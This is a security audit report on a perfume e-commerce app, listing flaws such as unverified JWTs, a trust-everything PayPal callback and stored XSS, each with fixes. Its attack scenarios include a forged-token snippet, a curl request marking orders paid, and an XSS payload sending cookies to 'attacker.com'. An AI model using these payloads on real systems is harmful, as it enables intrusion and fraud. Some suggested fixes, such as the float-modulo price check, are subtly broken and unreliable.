# 🔒 SECURITY AUDIT REPORT - Perfume E-Commerce Application

**Date:** February 1, 2026  
**Application:** Perfume E-Commerce Platform (React/Vite + Node.js/Express + Supabase)  
**Audit Scope:** Frontend, Backend, Database, API Communication, Configuration  

---

## 📊 Executive Summary

The application demonstrates **moderate security practices** with several **critical vulnerabilities** that require immediate attention. While basic authentication patterns are implemented, there are significant gaps in:

- JWT token verification
- Input sanitization and validation
- CORS security configuration
- SQL injection risks
- Credential exposure in configuration
- CSRF protection mechanisms

**Overall Risk Level:** 🔴 **HIGH** (Due to critical JWT and credential vulnerabilities)

---

## 🚨 CRITICAL VULNERABILITIES (IMMEDIATE FIX REQUIRED)

### 1. **JWT Token Not Verified with Secret Key** ⚠️ CRITICAL
**Location:** [backend/middleware/auth.js](backend/middleware/auth.js#L1)  
**Severity:** 🔴 CRITICAL  
**Risk Level:** Authentication Bypass

#### Issue:
```javascript
// VULNERABLE CODE - Line 10-11
const decoded = jwt.decode(token);  // ❌ decode() WITHOUT verification
if (!decoded || !decoded.sub) {
  return res.status(401).json({ error: 'Invalid token' });
}
```

The code uses `jwt.decode()` which **only decodes** the token without verifying the signature. An attacker can create a fake JWT with any user ID and bypass authentication.

#### Attack Scenario:
```javascript
// Attacker can create a fake token like this:
const fakeToken = jwt.sign({ 
  sub: 'admin-user-id',
  email: 'hacker@evil.com',
  user_metadata: { role: 'admin' }
}, 'any-secret-or-none');
// This token will pass validation in your current code!
```

#### Fix Required:
```javascript
import jwt from 'jsonwebtoken';

export const authenticateUser = (req, res, next) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Missing or invalid authorization header' });
    }

    const token = authHeader.substring(7);
    
    // ✅ CORRECT: Verify with Supabase JWT secret
    const jwtSecret = process.env.SUPABASE_JWT_SECRET;
    if (!jwtSecret) {
      return res.status(500).json({ error: 'Server misconfiguration' });
    }

    const decoded = jwt.verify(token, jwtSecret, {
      algorithms: ['HS256'],
      issuer: process.env.SUPABASE_URL,
      audience: 'authenticated'
    });

    req.user = {
      id: decoded.sub,
      email: decoded.email,
      role: decoded.user_metadata?.role || 'cliente'
    };

    next();
  } catch (error) {
    console.error('Token verification failed:', error.message);
    return res.status(401).json({ error: 'Unauthorized' });
  }
};
```

#### Required Environment Variables:
Add to `.env`:
```env
SUPABASE_JWT_SECRET=your_supabase_jwt_secret
```

---

### 2. **Supabase Keys Exposed in Frontend Code** 🔓 CRITICAL
**Location:** [src/services/supabase.js](src/services/supabase.js#L1-L5)  
**Severity:** 🔴 CRITICAL  
**Risk Level:** Credential Exposure, Unauthorized Data Access

#### Issue:
```javascript
// RISKY - These are anon keys but still tied to your database
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// This key appears in browser console, network requests, etc.
```

#### Risks:
1. **Anon Key Exposure**: While "anonymous," this key can still be abused to:
   - Perform RLS bypass attacks if policies are misconfigured
   - Enumerate database schema
   - Perform direct table access attacks

2. **Visible in Bundle**: Your keys are embedded in the built JavaScript files
3. **Accessible via Dev Tools**: Any user can inspect network requests and extract keys

#### Verification (Run in Browser Console):
```javascript
// Attacker can discover your keys
console.log(import.meta.env.VITE_SUPABASE_URL);
console.log(import.meta.env.VITE_SUPABASE_ANON_KEY);
```

#### Recommended Solution:
**Implement API Gateway Pattern:**

1. Create all database operations through your backend API
2. Backend uses Service Role Key (secure, never exposed)
3. Frontend only communicates with backend

**Example Updated Architecture:**
```javascript
// OLD - Direct Supabase access (VULNERABLE)
const { data } = await supabase
  .from('perfumes')
  .select('*');

// NEW - Through backend API (SECURE)
const response = await fetch('/api/perfumes', {
  headers: { 'Authorization': `Bearer ${userToken}` }
});
```

#### Current Risk Assessment:
- ✅ Good: Using VITE_ prefix ensures keys don't get sent to server
- ❌ Bad: Anon key still visible in production bundle
- ⚠️ Warning: If RLS policies are misconfigured, this is critical

---

### 3. **No CSRF Protection** 🔓 CRITICAL
**Location:** [backend/routes/orders.js](backend/routes/orders.js#L1), [backend/routes/payments.js](backend/routes/payments.js#L1)  
**Severity:** 🔴 CRITICAL  
**Risk Level:** State-Changing Operations Without Protection

#### Issue:
No CSRF tokens are implemented. An attacker can craft a malicious form that:
```html
<!-- Attacker's Website -->
<form action="https://yourapp.com/api/orders" method="POST">
  <input type="hidden" name="items" value="[...]">
  <input type="hidden" name="shippingAddress" value="[...]">
  <input type="submit" value="Click me!">
</form>

<!-- When logged-in user clicks it, order is created without their knowledge -->
```

#### Fix - Add CSRF Protection:
```javascript
// backend/server.js
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({ cookie: false })); // Store in session instead

// Add CSRF token to frontend
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Apply to routes
router.post('/', authenticateUser, (req, res, next) => {
  // CSRF check happens here
  // ...rest of code
});
```

**Frontend Update:**
```javascript
// Get CSRF token
const csrfToken = await fetch('/api/csrf-token').then(r => r.json());

// Include in requests
fetch('/api/orders', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken.csrfToken,
    'Authorization': `Bearer ${token}`
  },
  body: JSON.stringify(orderData)
});
```

---

### 4. **Unencrypted Bank Details in Response** 💳 CRITICAL
**Location:** [backend/routes/payments.js](backend/routes/payments.js#L50-L58)  
**Severity:** 🔴 CRITICAL  
**Risk Level:** Financial Data Exposure

#### Issue:
```javascript
// EXTREMELY DANGEROUS - Line 50-58
else if (paymentMethod === 'bank') {
  return res.json({
    sessionId: `bank_${orderId}`,
    bankDetails: {
      accountNumber: process.env.BANK_ACCOUNT_NUMBER,  // ❌ EXPOSED!
      bankCode: process.env.BANK_CODE,                  // ❌ EXPOSED!
      reference: orderId
    }
  });
}
```

#### Problems:
1. **Bank Account Numbers Exposed**: Sent in plain HTTP (if not HTTPS)
2. **Visible in Response**: User can see full account details
3. **Network Interception**: Anyone sniffing traffic sees bank details
4. **Browser History**: Details logged in browser history
5. **Debug Tools**: Visible in DevTools Network tab

#### Fix - Secure Payment Flow:
```javascript
// backend/routes/payments.js
router.post('/create-session', authenticateUser, async (req, res) => {
  try {
    const { orderId, paymentMethod } = req.body;
    const order = await getOrder(orderId);
    
    if (order.user_id !== req.user.id) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    if (paymentMethod === 'bank') {
      // Generate a unique, temporary reference
      const paymentRef = generateSecureReference(orderId);
      
      // Store bank details ONLY on server
      await storePaymentReference(paymentRef, orderId);
      
      // Send only reference to frontend
      return res.json({
        sessionId: paymentRef,
        // Show instructions but NOT actual account details
        instruction: `Send payment to reference: ${paymentRef}`
      });
    }
    
    // ... rest of code
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
```

**Send bank details securely:**
```javascript
// Option 1: Email to user (encrypted, not in response)
sendEmailWithBankDetails(user.email, bankDetails, paymentRef);

// Option 2: Show on secure page after verification
// Display bank details only to logged-in user on HTTPS
```

---

### 5. **Unvalidated PayPal Callback (No Webhook Verification)** ✅ CRITICAL
**Location:** [backend/routes/payments.js](backend/routes/payments.js#L63-L84)  
**Severity:** 🔴 CRITICAL  
**Risk Level:** Payment Manipulation, Order Fraud

#### Issue:
```javascript
// COMPLETELY UNPROTECTED - Line 63-84
router.post('/paypal-callback', async (req, res) => {
  try {
    const { orderId, paymentId, payerId } = req.body;

    // TODO: Verify PayPal payment
    // const verified = await verifyPayPalPayment(paymentId);

    // For now, accept as verified  ⚠️ ACCEPTS ANY REQUEST!
    const verified = true;

    if (verified) {
      await updateOrderStatus(orderId, 'paid', paymentId);
      return res.json({ status: 'success', message: 'Payment verified' });
    }
  }
});
```

#### Attack Scenario:
```bash
# Attacker can directly call this endpoint
curl -X POST https://yourapp.com/api/payments/paypal-callback \
  -H "Content-Type: application/json" \
  -d '{"orderId": "any-order-id", "paymentId": "fake123"}'

# Order immediately marked as "paid" - goods shipped!
```

#### Fix - Verify PayPal Webhooks:
```javascript
import crypto from 'crypto';

// Verify webhook signature
const verifyPayPalWebhook = async (req, res, next) => {
  try {
    const txnId = req.body.txn_id;
    const receiverEmail = req.body.receiver_email;
    const receivedSignature = req.body.signature;

    // Build verification string
    let verificationString = process.env.PAYPAL_IPN_SECRET;
    Object.keys(req.body)
      .sort()
      .forEach(key => {
        verificationString += `&${key}=${req.body[key]}`;
      });

    // Verify with PayPal
    const response = await fetch('https://www.paypal.com/cgi-bin/webscr', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `cmd=_notify-validate&${new URLSearchParams(req.body).toString()}`
    });

    const text = await response.text();
    if (text !== 'VERIFIED') {
      return res.status(400).json({ error: 'Invalid webhook' });
    }

    // Additional checks
    if (receiverEmail !== process.env.PAYPAL_RECEIVER_EMAIL) {
      return res.status(400).json({ error: 'Receiver mismatch' });
    }

    req.verified = true;
    next();
  } catch (error) {
    res.status(500).json({ error: 'Verification failed' });
  }
};

// Use middleware
router.post('/paypal-callback', verifyPayPalWebhook, async (req, res) => {
  const { custom: orderId } = req.body;
  
  // Only process if verified
  if (!req.verified) {
    return res.status(400).json({ error: 'Unverified webhook' });
  }

  await updateOrderStatus(orderId, 'paid', req.body.txn_id);
  res.json({ status: 'success' });
});
```

---

## ⚠️ HIGH-PRIORITY ISSUES

### 6. **Admin Operations Not Authorization-Checked** 🔓 HIGH
**Location:** [src/services/supabase.js](src/services/supabase.js#L36-L56)  
**Severity:** 🟠 HIGH  
**Risk Level:** Unauthorized Admin Operations

#### Issue:
```javascript
// No authorization check before admin operations!
async createPerfume(perfume) {
  const { data, error } = await supabase
    .from('perfumes')
    .insert([perfume])  // Anyone with anon key can do this!
    .select()
    .single();
  if (error) throw error;
  return data;
},

async updatePerfume(id, updates) {
  // Same problem - anyone can update
  const { data, error } = await supabase
    .from('perfumes')
    .update(updates)
    .eq('id', id)
    .select()
    .single();
  if (error) throw error;
  return data;
},
```

#### Fix 1: Move to Backend API
```javascript
// frontend - Updated perfumeService.js
async createPerfume(perfume) {
  const token = await getAuthToken();
  const response = await fetch(`${API_URL}/perfumes`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
      'X-CSRF-Token': getCsrfToken()
    },
    body: JSON.stringify(perfume)
  });
  
  if (!response.ok) {
    throw new Error('Failed to create perfume');
  }
  return response.json();
}
```

```javascript
// backend/routes/perfumes.js
router.post('/', authenticateUser, async (req, res) => {
  // Check authorization
  if (req.user.role !== 'admin' && req.user.role !== 'dueño') {
    return res.status(403).json({ error: 'Only admins can create perfumes' });
  }

  const { name, brand, price, description } = req.body;
  
  // Validate input
  if (!name || !brand || !price) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  // Create perfume (server-side with service role)
  const { data, error } = await supabase
    .from('perfumes')
    .insert([req.body])
    .select()
    .single();

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  res.status(201).json(data);
});
```

#### Fix 2: If Using Direct Supabase (Temporary)
Enable RLS and strict policies:
```sql
-- Only allow creation by admin users
CREATE POLICY "Only admins can create perfumes"
ON perfumes
FOR INSERT
TO authenticated
WITH CHECK (
  auth.jwt() ->> 'email' IN (
    SELECT email FROM users WHERE role IN ('admin', 'dueño')
  )
);

-- Only allow updates by admin users
CREATE POLICY "Only admins can update perfumes"
ON perfumes
FOR UPDATE
TO authenticated
USING (
  auth.jwt() ->> 'email' IN (
    SELECT email FROM users WHERE role IN ('admin', 'dueño')
  )
);
```

---

### 7. **Insufficient Input Validation** 📝 HIGH
**Location:** [backend/routes/orders.js](backend/routes/orders.js#L8-L34)  
**Severity:** 🟠 HIGH  
**Risk Level:** SQL Injection, Data Corruption, Business Logic Bypass

#### Issues:
```javascript
// Validation is present but insufficient
for (const item of items) {
  if (!item.id || !item.price || !item.quantity) {
    return res.status(400).json({ error: 'Invalid item format' });
  }
  if (typeof item.quantity !== 'number' || item.quantity < 1) {
    return res.status(400).json({ error: 'Invalid quantity' });
  }
  if (typeof item.price !== 'number' || item.price < 0) {
    return res.status(400).json({ error: 'Invalid price' });
  }
  // ❌ Missing: Max quantity check
  // ❌ Missing: Price range validation (prevent negative/overflow)
  // ❌ Missing: Item ID UUID validation
  // ❌ Missing: Verify items actually exist in DB
}
```

#### Enhanced Validation:
```javascript
import { z } from 'zod'; // Use zod for schema validation

const itemSchema = z.object({
  id: z.string().uuid('Invalid item ID'),
  price: z.number()
    .positive('Price must be positive')
    .max(999999.99, 'Price exceeds maximum')
    .refine(p => p % 0.01 === 0, 'Price must have max 2 decimals'),
  quantity: z.number()
    .int('Quantity must be integer')
    .min(1, 'Quantity must be at least 1')
    .max(100, 'Quantity cannot exceed 100'),
  name: z.string().min(1).max(255)
});

const shippingAddressSchema = z.object({
  city: z.string().min(1).max(100).trim(),
  address: z.string().min(5).max(500).trim(),
  postal_code: z.string().regex(/^[0-9A-Za-z\s-]{3,20}$/),
  country: z.string().min(2).max(100)
});

router.post('/', authenticateUser, async (req, res) => {
  try {
    const { items, shippingAddress } = req.body;

    // Validate structure
    const itemsArray = z.array(itemSchema).min(1).parse(items);
    const address = shippingAddressSchema.parse(shippingAddress);

    // Verify items exist and prices match
    for (const item of itemsArray) {
      const dbItem = await supabase
        .from('perfumes')
        .select('price, stock')
        .eq('id', item.id)
        .single();

      if (!dbItem.data) {
        return res.status(404).json({ error: `Item ${item.id} not found` });
      }

      // Verify price matches (prevent price manipulation)
      if (dbItem.data.price !== item.price) {
        return res.status(400).json({ 
          error: `Price mismatch for item ${item.id}`,
          expected: dbItem.data.price,
          provided: item.price
        });
      }

      // Check stock
      if (dbItem.data.stock < item.quantity) {
        return res.status(400).json({ 
          error: `Insufficient stock for item ${item.id}` 
        });
      }
    }

    // Create order with validated data
    const order = await createOrder(req.user.id, itemsArray, address);
    res.status(201).json(order);
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ 
        error: 'Validation failed',
        details: error.errors 
      });
    }
    res.status(500).json({ error: error.message });
  }
});
```

---

### 8. **Race Condition in Order Creation** ⚡ HIGH
**Location:** [backend/services/orderService.js](backend/services/orderService.js#L3-L22)  
**Severity:** 🟠 HIGH  
**Risk Level:** Overselling, Inventory Corruption

#### Issue:
```javascript
// No transaction - multiple requests can process simultaneously
export const createOrder = async (userId, items, shippingAddress) => {
  try {
    const total = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);

    // ⚠️ Check happens here
    // ⚠️ Multiple requests see same stock
    // ⚠️ Stock decreases AFTER all requests complete
    // Result: Overselling!

    const { data, error } = await supabase
      .from('orders')
      .insert({
        user_id: userId,
        items: items,
        shipping_address: shippingAddress,
        total: total,
        status: 'pending',
      })
      .select()
      .single();

    if (error) throw error;
    return data;
  } catch (err) {
    throw new Error(`Error creating order: ${err.message}`);
  }
};
```

#### Attack Scenario:
```
Time 0: Stock = 1 item
Time 0.1: User A requests 1 item - check passes (1 >= 1)
Time 0.1: User B requests 1 item - check passes (1 >= 1) ❌ Race condition!
Time 0.2: User A's order created
Time 0.2: User B's order created
Result: Oversold by 1 item!
```

#### Fix - Use Database Transactions:
```javascript
export const createOrder = async (userId, items, shippingAddress) => {
  try {
    // Use SQL transaction
    const { data, error } = await supabase.rpc('create_order_with_stock_check', {
      p_user_id: userId,
      p_items: items,
      p_shipping_address: JSON.stringify(shippingAddress),
      p_total: calculateTotal(items)
    });

    if (error) {
      if (error.message.includes('insufficient stock')) {
        throw new Error('Insufficient stock for one or more items');
      }
      throw error;
    }

    return data;
  } catch (err) {
    throw new Error(`Error creating order: ${err.message}`);
  }
};
```

```sql
-- Create stored procedure on database
CREATE OR REPLACE FUNCTION create_order_with_stock_check(
  p_user_id uuid,
  p_items jsonb,
  p_shipping_address text,
  p_total decimal
)
RETURNS jsonb AS $$
DECLARE
  v_order_id uuid;
  v_item jsonb;
BEGIN
  -- Start transaction implicitly
  
  -- Lock rows for update (prevents race conditions)
  FOR v_item IN SELECT jsonb_array_elements(p_items)
  LOOP
    -- Atomically check and update stock
    UPDATE perfumes
    SET stock = stock - (v_item->>'quantity')::int
    WHERE id = (v_item->>'id')::uuid
    AND stock >= (v_item->>'quantity')::int;

    IF NOT FOUND THEN
      RAISE EXCEPTION 'insufficient stock';
    END IF;
  END LOOP;

  -- Insert order
  INSERT INTO orders (user_id, items, shipping_address, total, status)
  VALUES (p_user_id, p_items, p_shipping_address, p_total, 'pending')
  RETURNING id INTO v_order_id;

  RETURN jsonb_build_object('id', v_order_id, 'status', 'pending');
EXCEPTION WHEN OTHERS THEN
  -- Rollback happens automatically
  RAISE;
END;
$$ LANGUAGE plpgsql;
```

---

### 9. **Unencrypted Password Minimum Too Weak** 🔐 HIGH
**Location:** [src/pages/Signup.jsx](src/pages/Signup.jsx#L38-L41)  
**Severity:** 🟠 HIGH  
**Risk Level:** Weak Passwords, Brute Force

#### Issue:
```javascript
// Line 38-41
if (password.length < 6) {
  throw new Error('La contraseña debe tener al menos 6 caracteres');
}
```

#### Problems:
1. **Too Short**: 6 characters is insufficient
2. **No Complexity**: No uppercase, lowercase, numbers, special chars required
3. **Brute Force**: Weak passwords easily guessed

#### Industry Standard:
- Minimum 12 characters (NIST recommendation)
- Or 8 characters with complexity

#### Fix:
```javascript
const validatePassword = (password) => {
  const errors = [];

  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  }

  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain uppercase letter');
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain lowercase letter');
  }

  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain number');
  }

  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
    errors.push('Password must contain special character');
  }

  return errors;
};

const handleSignup = async (e) => {
  e.preventDefault();
  const { password, confirmPassword } = formData;

  const passwordErrors = validatePassword(password);
  if (passwordErrors.length > 0) {
    setError(passwordErrors.join('; '));
    return;
  }

  if (password !== confirmPassword) {
    setError('Passwords do not match');
    return;
  }

  // ... rest of signup
};
```

---

### 10. **Missing HTTPS Configuration in CORS** 🔒 HIGH
**Location:** [backend/server.js](backend/server.js#L12-L15)  
**Severity:** 🟠 HIGH  
**Risk Level:** Man-in-the-Middle Attacks

#### Issue:
```javascript
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5173',  // ❌ Allows HTTP!
  credentials: true
}));
```

#### Problems:
1. **Default to HTTP**: Fallback to insecure HTTP
2. **No HTTPS Enforcement**: Even if env is set, no enforcement
3. **Dev Setup Encourages Insecurity**: HTTP works in development

#### Fix:
```javascript
// backend/server.js
const isProduction = process.env.NODE_ENV === 'production';

// Enforce HTTPS in production
if (isProduction) {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
      next();
    }
  });
}

// Configure CORS
const allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(',');

if (!isProduction && !allowedOrigins.length) {
  allowedOrigins.push('http://localhost:5173'); // Dev only
}

// Validate origins
if (isProduction && !allowedOrigins.length) {
  console.error('ALLOWED_ORIGINS not configured in production!');
  process.exit(1);
}

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 3600
}));

// Helmet for additional headers
import helmet from 'helmet';
app.use(helmet({
  strictTransportSecurity: { maxAge: 31536000, includeSubDomains: true },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://']
    }
  }
}));
```

**Environment Variables:**
```env
NODE_ENV=production
ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
FRONTEND_URL=https://yourdomain.com
```

---

## 🟡 MEDIUM-PRIORITY ISSUES

### 11. **JWT Token Stored in Session Storage** 📋 MEDIUM
**Location:** [src/context/AuthContext.jsx](src/context/AuthContext.jsx#L83-L90)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Token Exposure to XSS

#### Issue:
Supabase stores auth tokens in localStorage by default, which is vulnerable to XSS attacks.

#### Risk:
```javascript
// If attacker injects XSS:
const token = localStorage.getItem('supabase.auth.token');
// Attacker now has the token!
```

#### Fix - Use HTTP-Only Cookies:
```javascript
// backend/middleware/auth.js
export const setAuthCookie = (res, token, refreshToken) => {
  res.cookie('authToken', token, {
    httpOnly: true,      // ✅ Not accessible to JavaScript
    secure: true,        // ✅ Only sent over HTTPS
    sameSite: 'strict',  // ✅ CSRF protection
    maxAge: 3600000,     // 1 hour
    path: '/'
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 604800000,   // 7 days
    path: '/'
  });
};
```

#### Frontend Update:
```javascript
// Remove from localStorage, use cookies instead
// Supabase has built-in support for cookies
```

---

### 12. **No Input Sanitization (XSS Risk)** 💉 MEDIUM
**Location:** [src/pages/AdminPanel.jsx](src/pages/AdminPanel.jsx#L1-L150)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Stored XSS, Reflected XSS

#### Issue:
User inputs are not sanitized before storage or display:

```javascript
// Vulnerable - no sanitization
const { name, brand, price, description } = formData;

const perfume = {
  name,        // Could contain: <script>alert('XSS')</script>
  brand,       // Could contain: <img src=x onerror=alert('XSS')>
  description  // Could contain malicious HTML
};
```

#### Attack Scenario:
1. Admin enters: `<img src=x onerror="fetch('http://attacker.com/steal-cookies')">`
2. Product saved to database
3. Any user viewing product executes script
4. Cookies stolen

#### Fix:
```javascript
import DOMPurify from 'dompurify';

const handleSubmit = async (e) => {
  e.preventDefault();
  
  try {
    // Sanitize inputs
    const sanitized = {
      name: DOMPurify.sanitize(formData.name, { 
        ALLOWED_TAGS: [], 
        ALLOWED_ATTR: [] 
      }).trim(),
      brand: DOMPurify.sanitize(formData.brand, { 
        ALLOWED_TAGS: [], 
        ALLOWED_ATTR: [] 
      }).trim(),
      price: parseFloat(formData.price),
      description: DOMPurify.sanitize(formData.description, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
        ALLOWED_ATTR: []
      }).trim(),
      category: formData.category,
      stock: parseInt(formData.stock)
    };

    // Validate
    if (!sanitized.name || sanitized.name.length > 255) {
      throw new Error('Invalid product name');
    }

    // Create perfume with sanitized data
    const perfume = await perfumeService.createPerfume(sanitized);
    setSuccess('Perfume created successfully');
  } catch (err) {
    setError(err.message);
  }
};
```

**Install DOMPurify:**
```bash
npm install dompurify
npm install -D @types/dompurify
```

---

### 13. **No Rate Limiting on Endpoints** 🚀 MEDIUM
**Location:** [backend/routes/orders.js](backend/routes/orders.js#L1), [backend/routes/payments.js](backend/routes/payments.js#L1)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Brute Force, DoS Attacks

#### Issue:
No rate limiting allows attackers to:
- Brute force order IDs
- Create thousands of fake orders
- Abuse payment endpoints

#### Fix:
```javascript
// backend/middleware/rateLimit.js
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import redis from 'redis';

const redisClient = redis.createClient({
  host: process.env.REDIS_HOST || 'localhost',
  port: process.env.REDIS_PORT || 6379
});

// General API rate limit
export const generalLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:general:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                   // 100 requests
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

// Strict limit for payment operations
export const paymentLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:payment:'
  }),
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,                    // 10 payment attempts
  message: 'Too many payment attempts',
  skip: (req) => req.user.role === 'admin'
});

// Moderate limit for order creation
export const orderLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:order:'
  }),
  windowMs: 60 * 1000, // 1 minute
  max: 5,               // 5 orders per minute
  message: 'Too many order attempts'
});
```

**Apply to routes:**
```javascript
// backend/server.js
import { 
  generalLimiter, 
  paymentLimiter, 
  orderLimiter 
} from './middleware/rateLimit.js';

app.use('/api/', generalLimiter);
app.use('/api/orders', orderLimiter);
app.use('/api/payments', paymentLimiter);
```

**Install dependencies:**
```bash
npm install express-rate-limit rate-limit-redis redis
```

---

### 14. **User Role Determined by Unverified JWT Metadata** 🎭 MEDIUM
**Location:** [backend/middleware/auth.js](backend/middleware/auth.js#L18)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Authorization Bypass

#### Issue:
```javascript
req.user = {
  id: decoded.sub,
  email: decoded.email,
  role: decoded.user_metadata?.role || 'cliente'  // ⚠️ Trusts JWT!
};
```

The role comes from the JWT token which could be manipulated if token verification is fixed.

#### Fix:
```javascript
// Fetch role from database instead
export const authenticateUser = async (req, res, next) => {
  try {
    const token = authHeader.substring(7);
    
    const decoded = jwt.verify(token, jwtSecret);

    // Fetch role from database
    const { data: userData, error } = await supabase
      .from('users')
      .select('role')
      .eq('id', decoded.sub)
      .single();

    if (error) {
      return res.status(401).json({ error: 'User not found' });
    }

    req.user = {
      id: decoded.sub,
      email: decoded.email,
      role: userData.role // ✅ From database, not JWT
    };

    next();
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized' });
  }
};
```

---

### 15. **Signup Doesn't Wait for User Creation** ⏱️ MEDIUM
**Location:** [src/pages/Signup.jsx](src/pages/Signup.jsx#L70-L84)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Race Condition, Authentication Issues

#### Issue:
```javascript
// NOT waiting for signup to complete
supabase.auth.signUp({
  email,
  password,
  options: { data: { full_name: name, /* ... */ } }
}).then(({ data, error }) => {
  if (error) {
    setError(error.message);
    setLoading(false);
  }
  // ⚠️ If error, doesn't return early
});

// Navigates immediately (after 1 second)
setTimeout(() => {
  setLoading(false);
  navigate('/');
}, 1000);
```

#### Problems:
1. Ignores signup errors
2. Navigates before signup completes
3. User created but not authenticated
4. Race condition with DB user creation

#### Fix:
```javascript
const handleSignup = async (e) => {
  e.preventDefault();
  setError('');
  setLoading(true);

  try {
    const { name, email, phone, address, city, postalCode, password, confirmPassword } = formData;

    // Validations
    if (!name || !email || !password || !confirmPassword) {
      throw new Error('Please fill all required fields');
    }

    if (password.length < 12) {
      throw new Error('Password must be at least 12 characters');
    }

    if (password !== confirmPassword) {
      throw new Error('Passwords do not match');
    }

    // ✅ WAIT for signup to complete
    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          full_name: name,
          phone: phone || null,
          address: address || null,
          city: city || null,
          postal_code: postalCode || null,
        }
      }
    });

    if (error) {
      throw new Error(error.message);
    }

    if (!data.user) {
      throw new Error('Signup failed');
    }

    // Wait for user profile to be created
    await new Promise(resolve => setTimeout(resolve, 2000));

    // ✅ Only navigate after successful signup
    setLoading(false);
    navigate('/', { state: { signupSuccess: true } });
  } catch (err) {
    setError(err.message || 'Signup failed');
    setLoading(false);
  }
};
```

---

### 16. **No Audit Logging for Admin Actions** 📝 MEDIUM
**Location:** [backend/routes/orders.js](backend/routes/orders.js#L1), [backend/routes/payments.js](backend/routes/payments.js#L90)  
**Severity:** 🟡 MEDIUM  
**Risk Level:** Security Monitoring Gap, Fraud Detection

#### Issue:
No logging of:
- Who updated orders
- Who confirmed bank payments
- Who created/modified perfumes
- Failed authentication attempts

#### Fix - Add Audit Logging:
```javascript
// backend/services/auditService.js
import { supabase } from '../server.js';

export const logAction = async (userId, action, resourceType, resourceId, details = {}) => {
  try {
    await supabase.from('audit_logs').insert({
      user_id: userId,
      action,
      resource_type: resourceType,
      resource_id: resourceId,
      ip_address: details.ipAddress,
      user_agent: details.userAgent,
      changes: details.changes,
      status: details.status || 'success',
      error_message: details.errorMessage,
      created_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('Failed to log audit action:', err);
  }
};

// Use in routes
router.post('/confirm-bank', authenticateUser, async (req, res) => {
  try {
    // ... validation code ...

    const oldOrder = await getOrder(orderId);
    await updateOrderStatus(orderId, 'paid', transactionId);

    // ✅ Log the action
    await logAction(
      req.user.id,
      'CONFIRM_PAYMENT',
      'order',
      orderId,
      {
        ipAddress: req.ip,
        userAgent: req.get('user-agent'),
        changes: {
          from_status: oldOrder.status,
          to_status: 'paid',
          transaction_id: transactionId
        }
      }
    );

    res.json({ status: 'success' });
  } catch (error) {
    await logAction(
      req.user.id,
      'CONFIRM_PAYMENT_FAILED',
      'order',
      orderId,
      {
        ipAddress: req.ip,
        userAgent: req.get('user-agent'),
        status: 'failed',
        errorMessage: error.message
      }
    );

    res.status(500).json({ error: error.message });
  }
});
```

**Create audit log table:**
```sql
CREATE TABLE audit_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id),
  action VARCHAR(100) NOT NULL,
  resource_type VARCHAR(50),
  resource_id VARCHAR(100),
  ip_address VARCHAR(45),
  user_agent TEXT,
  changes JSONB,
  status VARCHAR(20),
  error_message TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_audit_user_id ON audit_logs(user_id);
CREATE INDEX idx_audit_created_at ON audit_logs(created_at);
CREATE INDEX idx_audit_resource ON audit_logs(resource_type, resource_id);
```

---

## 🟢 LOW-PRIORITY RECOMMENDATIONS

